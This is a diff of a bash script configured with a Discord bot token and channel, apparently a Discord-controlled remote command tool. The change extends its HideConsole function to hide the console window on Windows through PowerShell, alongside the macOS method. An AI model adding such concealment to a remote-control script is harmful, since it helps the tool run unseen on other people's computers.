@@ -19,7 +19,7 @@
 token="YOUR_BOT_TOKEN_HERE" # Your bot intents should be on and 'read messages' permissions when joining your server
 chan="CHANNEL_ID_HERE" # On Discord app rightclick the channel > 'Copy Channel ID' (Make sure the bot can access this channel)
 bot_id="BOT_USER_ID_HERE" # Settings > Advanced > Developer mode ON -- then On Discord app rightclick the bot > 'Copy User ID' 
-HideWindow=1 # (linux and mac only) -- 1 = hide console window
+HideWindow=1 # 1 = hide console window
 
 generate_random_letters() {
     local letters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -34,7 +34,12 @@ generate_random_letters() {
 
 HideConsole() {
     if [ $HideWindow -gt 0 ]; then
-        osascript -e 'tell application "Terminal" to set visible of window 1 to false'
+
+        if [ "$(expr substr $(uname -s) 1 5)" = "MINGW" ]; then
+            powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c exit' -NoNewWindow -Wait"
+        else
+            osascript -e 'tell application "Terminal" to set visible of window 1 to false'
+        fi
     fi
 }
 
